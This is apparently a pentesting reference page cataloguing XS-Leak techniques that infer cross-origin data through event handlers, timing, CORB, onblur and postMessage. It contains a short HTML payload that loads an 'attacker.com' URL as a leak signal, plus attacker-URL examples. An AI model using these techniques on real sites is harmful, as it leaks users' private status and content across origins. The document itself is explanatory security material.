# XS-Search/XS-Leaks - Event Handler Techniques

## Event Handler Techniques


### Onload/Onerror

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Summary**: if trying to load a resource onerror/onload events are triggered with the resource is loaded successfully/unsuccessfully it's possible to figure out the status code.
- **Code example**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

The code example try lo **load scripts objects from JS**, but **other tags** such as objects, stylesheets, images, audios could be also used. Moreover, it's also possible to inject the **tag directly** and declare the `onload` and `onerror` events inside the tag (instead of injecting it from JS).

There is also a script-less version of this attack:

```html
<object data="//example.com/404">
  <object data="//attacker.com/?error"></object>
</object>
```

In this case if `example.com/404` is not found `attacker.com/?error` will be loaded.

### Onload Timing

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Summary:** The [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** can be used to measure how much time it takes to perform a request. However, other clocks could be used, such as [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) which can identify tasks running for more than 50ms.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) another example in:

#### Onload Timing + Forced Heavy Task

This technique is just like the previous one, but the **attacker** will also **force** some action to take a **relevant amount time** when the **answer is positive or negative** and measure that time.

### unload/beforeunload Timing

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Summary:** The [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) can be used to measure how much time it takes to perform a request. Other clocks could be used.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

The time taken to fetch a resource can be measured by utilizing the [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) and [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) events. The **`beforeunload`** event is fired when the browser is about to navigate to a new page, while the **`unload`** event occurs when the navigation is actually taking place. The time difference between these two events can be calculated to determine the **duration the browser spent fetching the resource**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Summary:** The [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API can be used to measure how much time it takes to perform a request. Other clocks could be used.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

It has been observed that in the absence of [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), the time required for a page and its subresources to load over the network can be measured by an attacker. This measurement is typically possible because the `onload` handler of an iframe is triggered only after the completion of resource loading and JavaScript execution. To bypass the variability introduced by script execution, an attacker might employ the [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribute within the `<iframe>`. The inclusion of this attribute restricts numerous functionalities, notably the execution of JavaScript, thereby facilitating a measurement that is predominantly influenced by network performance.

```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```

### #ID + error + onload

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**:
- **Summary**: If you can make the page error when the correct content is accessed and make it load correctly when any content is accessed, then you can make a loop to extract all the information without measuring the time.
- **Code Example**:

Suppose that you can **insert** the **page** that has the **secret** content **inside an Iframe**.

You can **make the victim search** for the file that contains "_**flag**_" using an **Iframe** (exploiting a CSRF for example). Inside the Iframe you know that the _**onload event**_ will be **executed always at least once**. Then, you can **change** the **URL** of the **iframe** but changing only the **content** of the **hash** inside the URL.

For example:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

If the first URL was **successfully loaded**, then, when **changing** the **hash** part of the URL the **onload** event **won't be triggered** again. But **if** the page had some kind of **error** when **loading**, then, the **onload** event will be **triggered again**.

Then, you can **distinguish between** a **correctly** loaded page or page that has an **error** when is accessed.

### Javascript Execution

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**:
- **Summary:** If the **page** is **returning** the **sensitive** content, **or** a **content** that can be **controlled** by the user. The user could set **valid JS code in the negative case**, an **load** each try inside **`<script>`** tags, so in **negative** cases attackers **code** is **executed,** and in **affirmative** cases **nothing** will be executed.
- **Code Example:**

### CORB - Onerror

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code & Headers
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Summary**: **Cross-Origin Read Blocking (CORB)** is a security measure that prevents web pages from loading certain sensitive cross-origin resources to protect against attacks like **Spectre**. However, attackers can exploit its protective behavior. When a response subject to **CORB** returns a _**CORB protected**_ `Content-Type` with `nosniff` and a `2xx` status code, **CORB** strips the response's body and headers. Attackers observing this can infer the combination of the **status code** (indicating success or error) and the `Content-Type` (denoting whether it's protected by **CORB**), leading to potential information leakage.
- **Code Example:**

Check the more information link for more information about the attack.

### onblur

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Summary**: Leak sensitive data from the id or name attribute.
- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

It's possible to **load a page** inside an **iframe** and use the **`#id_value`** to make the page **focus on the element** of the iframe with indicated if, then if an **`onblur`** signal is triggered, the ID element exists.\
You can perform the same attack with **`portal`** tags.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Summary**: Gather sensitive information from a postMessage or use the presence of postMessages as an oracle to know the status of the user in the page
- **Code Example**: `Any code listening for all postMessages.`

Applications frequently utilize [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) to communicate across different origins. However, this method can inadvertently expose **sensitive information** if the `targetOrigin` parameter is not properly specified, allowing any window to receive the messages. Furthermore, the mere act of receiving a message can act as an **oracle**; for instance, certain messages might only be sent to users who are logged in. Therefore, the presence or absence of these messages can reveal information about the user's state or identity, such as whether they are authenticated or not.
